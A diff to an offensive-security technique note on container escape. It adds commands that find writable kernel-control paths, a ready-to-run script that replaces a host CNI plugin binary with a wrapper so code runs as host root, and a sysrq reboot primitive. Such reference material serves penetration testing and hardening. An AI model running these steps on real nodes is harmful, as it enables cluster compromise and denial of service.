@@ -4,7 +4,7 @@ type: technique
 tags: [linux, container, docker, kubernetes, privilege-escalation, container-escape]
 phase: privilege-escalation
 date_created: 2026-07-14
-date_updated: 2026-07-14
+date_updated: 2026-07-15
 sources: [hacktricks-linux]
 ---
 
@@ -145,3 +145,28 @@ find /host-var/lib/kubelet/pods -type f -path '*kubernetes.io~projected*token' 2
 ```
 
 A stolen token with broad RBAC turns local exec into cluster-wide compromise. `nodes/proxy` with only `get` is dangerous because it still reaches kubelet exec endpoints.
+
+---
+
+## More sensitive host mounts: binfmt_misc, sysrq, debugfs/efivars/securityfs, CNI plugin swap
+
+Extending the core_pattern / uevent_helper / modprobe section above, other host mounts collapse isolation. Sweep for writable kernel-control paths and host-side execution surfaces first.
+
+```bash
+find /proc/sys -maxdepth 3 -writable 2>/dev/null | head
+find /sys -maxdepth 4 -writable 2>/dev/null | head
+mount | grep -E 'overlay|/host|/rootfs'                 # recover container-to-host path (upperdir)
+```
+
+Host-exec primitives beyond core_pattern:
+- `/proc/sys/fs/binfmt_misc`: register a handler for a magic value; executing a matching file triggers host-context execution.
+- `/proc/sysrq-trigger`: `echo b >` reboots the host (DoS but serious).
+
+Kubernetes-flavored mounts are often the real path in infra pods: a writable `/opt/cni/bin` lets you replace a CNI plugin (bridge/portmap/calico/flannel/cilium-cni) so the kubelet runs your code as host on the next pod sandbox creation on that node.
+
+```bash
+plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | grep -E '/(bridge|portmap|calico|flannel|cilium-cni)$' | head -n1)
+mv "$plugin" "$plugin.orig"; printf '#!/bin/sh\nid>/tmp/cni\nexec "%s.orig" "$@"\n' "$plugin" > "$plugin"; chmod +x "$plugin"
+```
+
+Also treat as critical when mounted/writable: `/sys/kernel/debug` (debugfs, huge kernel-facing surface), `/sys/firmware/efi/efivars` (firmware-backed boot settings), `/sys/kernel/security` (LSM securityfs). Recon sources for kernel exploitation: `/proc/kallsyms`, `/proc/config.gz`, `/proc/kcore`. Mount-handling runtime CVEs to remember: runc CVE-2024-21626, BuildKit CVE-2024-2365x, containerd CVE-2025-47290.
